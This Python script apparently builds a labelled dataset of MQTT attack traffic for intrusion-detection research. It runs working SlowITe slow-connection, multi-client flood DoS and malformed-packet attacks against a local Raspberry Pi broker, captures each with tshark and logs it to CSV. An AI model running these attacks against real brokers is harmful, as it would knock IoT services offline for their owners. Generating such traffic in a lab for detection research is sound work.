import csv
from io import StringIO
import subprocess
import pandas as pd
import threading
import time
import random
import socket
import paho.mqtt.client as mqtt
from datetime import datetime
import os

# Broker configuration
BROKER = "raspberrypi.local"
PORT = 1883
TOPIC = "iot/attack"
DOS_CLIENTS = 100
SLOWITE_CLIENTS = 50

# TShark capture fields
tshark_fields = [
    "tcp.flags", "tcp.time_delta", "tcp.len",
    "mqtt.conack.flags", "mqtt.conack.flags.reserved", "mqtt.conack.flags.sp",
    "mqtt.conack.val", "mqtt.conflag.cleansess", "mqtt.conflag.passwd",
    "mqtt.conflag.qos", "mqtt.conflag.reserved", "mqtt.conflag.retain",
    "mqtt.conflag.uname", "mqtt.conflag.willflag", "mqtt.conflags",
    "mqtt.dupflag", "mqtt.hdrflags", "mqtt.kalive", "mqtt.len",
    "mqtt.topic", "mqtt.msg", "mqtt.msgid", "mqtt.msgtype",
    "mqtt.proto_len", "mqtt.protoname", "mqtt.qos", "mqtt.retain",
    "mqtt.sub.qos", "mqtt.suback.qos", "mqtt.ver",
    "mqtt.willmsg", "mqtt.willmsg_len", "mqtt.willtopic", "mqtt.willtopic_len"
]

# Output log
LOG_FILE = "attack_traffic_log.csv"

# Create log file if it doesn't exist
if not os.path.exists(LOG_FILE):
    pd.DataFrame(columns=tshark_fields + ["target"]).to_csv(LOG_FILE, index=False)

# Function to capture traffic during an attack
def capture_attack_traffic(attack_name, duration=30):
    fields_str = " ".join([f"-e {field}" for field in tshark_fields])
    tshark_cmd = f"""tshark -i any -a duration:{duration} -Y mqtt -T fields {fields_str} -E separator=, -E quote=d -E header=n"""

    print(f"[*] Capturing traffic for {attack_name}...")

    try:
        result = subprocess.run(tshark_cmd, shell=True, capture_output=True, text=True, timeout=duration + 5)
        lines = result.stdout.strip().split("\n")

        if not lines:
            print(f"[!] No packets captured for {attack_name}.")
            return
        
        parsed_rows = []
        for line in lines:
            reader = csv.reader(StringIO(line))
            parsed = next(reader)
            # Pad or trim
            if len(parsed) < len(tshark_fields):
                parsed += [''] * (len(tshark_fields) - len(parsed))
            elif len(parsed) > len(tshark_fields):
                parsed = parsed[:len(tshark_fields)]
            parsed_rows.append(parsed)

        df = pd.DataFrame(parsed_rows, columns=tshark_fields)
        df.fillna("", inplace=True)
        df["target"] = attack_name

        df.to_csv(LOG_FILE, mode='a', index=False, header=False)
        print(f"[+] Logged {len(df)} packets for '{attack_name}'.")

    except Exception as e:
        print(f"[!] Error capturing traffic for {attack_name}: {e}")


# Attack definitions

def slowite_attack():
    print("[*] Starting SlowITe attack...")

    def slow_client(i):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((BROKER, PORT))
            packet = bytearray([
                0x10, 0x1C, 0x00, 0x04, 0x4D, 0x51, 0x54, 0x54, 
                0x04, 0x02, 0x00, 0x3C, 0x00, 0x00
            ])
            for byte in packet:
                s.send(bytes([byte]))
                time.sleep(2)
        except Exception as e:
            print(f"[SlowITe-{i}] Error: {e}")

    threads = []
    for i in range(SLOWITE_CLIENTS):
        t = threading.Thread(target=slow_client, args=(i,))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print("[+] SlowITe attack completed.\n")

def dos_attack():
    print("[*] Starting DoS attack...")

    def flood_client(i):
        try:
            client = mqtt.Client(client_id=f"dos_{i}")
            client.connect(BROKER, PORT, keepalive=60)
            client.loop_start()
            for _ in range(20):
                client.publish(f"{TOPIC}/dos", payload=f"dos-{i}", qos=0)
                time.sleep(0.1)
            client.loop_stop()
            client.disconnect()
        except Exception as e:
            print(f"[DoS-{i}] Error: {e}")

    threads = []
    for i in range(DOS_CLIENTS):
        t = threading.Thread(target=flood_client, args=(i,))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print("[+] DoS attack completed.\n")

def malformed_attack():
    print("[*] Starting Malformed attack...")

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((BROKER, PORT))
        malformed_packet = b'\x10\xFF\x00\x00\x00\x00'
        s.send(malformed_packet)
        time.sleep(1)
        s.close()
    except Exception as e:
        print(f"[Malformed] Error: {e}")

    print("[+] Malformed attack completed.\n")

# Attack loop

def main():
    try:
        ddos_burst_count = 0  # How many times to run DDoS at the start
        round_num = 0

        while True:
            if ddos_burst_count > 0:
                attack_name, attack_func = "ddos", dos_attack
                ddos_burst_count -= 1
            else:
                # Alternate between malformed and slowite
                attack_name, attack_func = random.choice([
                    ("malformed", malformed_attack)#,
                    #("slowite", slowite_attack)
                ])

            print(f"\n[ROUND {round_num}] Running {attack_name.upper()} attack")
            round_num += 1

            # Start tshark capture thread
            capture_thread = threading.Thread(target=capture_attack_traffic, args=(attack_name, 45))
            capture_thread.start()

            # Run attack
            attack_func()

            # Wait for tshark
            capture_thread.join()

            print("[*] Sleeping 1 minutes before next round...\n")
            time.sleep(60)  # 1 minutes

    except KeyboardInterrupt:
        print("[-] Attack simulation manually stopped.")
        
if __name__ == "__main__":
    main()
